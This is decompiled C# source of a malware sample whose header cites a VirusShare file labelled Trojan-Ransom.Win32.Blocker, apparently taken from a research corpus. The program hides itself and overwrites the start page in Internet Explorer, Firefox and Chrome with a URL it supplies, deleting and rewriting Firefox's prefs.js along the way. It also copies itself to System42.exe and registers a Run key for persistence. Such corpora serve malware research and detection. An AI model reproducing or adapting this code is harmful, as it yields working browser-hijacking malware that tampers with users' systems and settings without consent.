// Decompiled with JetBrains decompiler
// Type: AnaSayfaDegistirici.Form1
// Assembly: AnaSayfaDegistirici, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50C65A65-FFAB-48D9-BE72-60D75D5F79D0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.azpe-4a3aa0165382b826f06afa95b5bf6d97676c4bf4.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace AnaSayfaDegistirici
{
  public class Form1 : Form
  {
    private anasayfacek cek = new anasayfacek();
    private IContainer components = (IContainer) null;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.cek.Bos();
      string userName = Environment.UserName;
      string str = Environment.OSVersion.Version.Major.ToString();
      this.IEDegistir();
      this.MSConfigOturtXP();
      if (str == "5")
      {
        this.MSConfigOturtXP();
        string[] directories1 = Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Application Data\\");
        string[] directories2 = Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\");
        foreach (string path in directories1)
        {
          if (new DirectoryInfo(path).Name == "Mozilla")
            this.MozillaDegistirXP();
        }
        foreach (string path in directories2)
        {
          if (new DirectoryInfo(path).Name == "Google")
            this.GoogleChromeXp();
        }
        Application.Exit();
      }
      else if (str == "6")
      {
        this.MSConfigOturtWin7();
        string[] directories3 = Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Roaming\\");
        string[] directories4 = Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Local\\");
        foreach (string path in directories3)
        {
          if (new DirectoryInfo(path).Name == "Mozilla")
            this.MozillaDegistirWin7();
        }
        foreach (string path in directories4)
        {
          if (new DirectoryInfo(path).Name == "Google")
            this.GoogleChromeWin7();
        }
        Application.Exit();
      }
      else
        Application.Exit();
    }

    public void MozillaDegistirWin7()
    {
      string str = "";
      string userName = Environment.UserName;
      foreach (string directory in Directory.GetDirectories("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"))
        str = new DirectoryInfo(directory).Name;
      File.Delete("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + str + "\\prefs.js");
      StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + str + "\\prefs.js");
      streamWriter.WriteLine("# Mozilla User Preferences" + Environment.NewLine + "user_pref(\"app.update.lastUpdateTime.browser-cleanup-thumbnails\", 1364819221);" + Environment.NewLine + "user_pref(\"browser.cache.disk.capacity\", 1048576);" + Environment.NewLine + "user_pref(\"browser.cache.disk.smart_size.first_run\", false);" + Environment.NewLine + "user_pref(\"browser.migration.version\", 8);" + Environment.NewLine + "user_pref(\"browser.pagethumbnails.storage_version\", 2);" + Environment.NewLine + "user_pref(\"browser.places.smartBookmarksVersion\", 4);" + Environment.NewLine + "user_pref(\"browser.rights.3.shown\", true);" + Environment.NewLine + "user_pref(\"browser.startup.homepage\", \"" + this.cek.Bos() + "\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.buildID\", \"20130307023931\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.mstone\", \"19.0.2\");");
      streamWriter.Close();
    }

    public void MozillaDegistirXP()
    {
      string str = "";
      string userName = Environment.UserName;
      foreach (string directory in Directory.GetDirectories("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\"))
        str = new DirectoryInfo(directory).Name;
      File.Delete("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\" + str + "\\prefs.js");
      StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\" + userName + "\\Application Data\\Mozilla\\Firefox\\Profiles\\" + str + "\\prefs.js");
      streamWriter.WriteLine("# Mozilla User Preferences" + Environment.NewLine + "user_pref(\"app.update.lastUpdateTime.browser-cleanup-thumbnails\", 1364819221);" + Environment.NewLine + "user_pref(\"browser.cache.disk.capacity\", 1048576);" + Environment.NewLine + "user_pref(\"browser.cache.disk.smart_size.first_run\", false);" + Environment.NewLine + "user_pref(\"browser.migration.version\", 8);" + Environment.NewLine + "user_pref(\"browser.pagethumbnails.storage_version\", 2);" + Environment.NewLine + "user_pref(\"browser.places.smartBookmarksVersion\", 4);" + Environment.NewLine + "user_pref(\"browser.rights.3.shown\", true);" + Environment.NewLine + "user_pref(\"browser.startup.homepage\", \"" + this.cek.Bos() + "\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.buildID\", \"20130307023931\");" + Environment.NewLine + "user_pref(\"browser.startup.homepage_override.mstone\", \"19.0.2\");");
      streamWriter.Close();
    }

    public void GoogleChromeWin7()
    {
      string userName = Environment.UserName;
      StreamReader streamReader = new StreamReader("C:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences");
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      int startIndex = end.IndexOf("   \"session\": {") + 3;
      int length = end.Substring(startIndex).IndexOf("   },") + 5;
      string oldValue = end.Substring(startIndex, length);
      StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + userName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences");
      streamWriter.WriteLine(end.Replace(oldValue, "\"session\": {" + Environment.NewLine + "      \"restore_on_startup\": 4," + Environment.NewLine + "      \"restore_on_startup_migrated\": true," + Environment.NewLine + "      \"urls_to_restore_on_startup\": [ \"" + this.cek.Bos() + "\" ]" + Environment.NewLine + "   },"));
      streamWriter.Close();
    }

    public void GoogleChromeXp()
    {
      string userName = Environment.UserName;
      StreamReader streamReader = new StreamReader("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Preferences");
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      int startIndex = end.IndexOf("   \"session\": {") + 3;
      int length = end.Substring(startIndex).IndexOf("   },") + 5;
      string oldValue = end.Substring(startIndex, length);
      StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\" + userName + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Preferences");
      streamWriter.WriteLine(end.Replace(oldValue, "\"session\": {" + Environment.NewLine + "      \"restore_on_startup\": 4," + Environment.NewLine + "      \"restore_on_startup_migrated\": true," + Environment.NewLine + "      \"urls_to_restore_on_startup\": [ \"" + this.cek.Bos() + "\" ]" + Environment.NewLine + "   },"));
      streamWriter.Close();
    }

    public void IEDegistir()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", true);
      registryKey.SetValue("Start Page", (object) (this.cek.Bos() ?? ""));
      registryKey.Close();
    }

    public void MSConfigOturtWin7()
    {
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\ProgramData\\System42.exe");
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System38", (object) "C:\\ProgramData\\System42.exe", RegistryValueKind.String);
      }
      catch
      {
      }
    }

    public void MSConfigOturtXP()
    {
      string userName = Environment.UserName;
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\Documents and Settings\\" + userName + "\\System42.exe");
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System38", (object) ("C:\\Documents and Settings\\" + userName + "\\System42.exe"), RegistryValueKind.String);
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 0);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
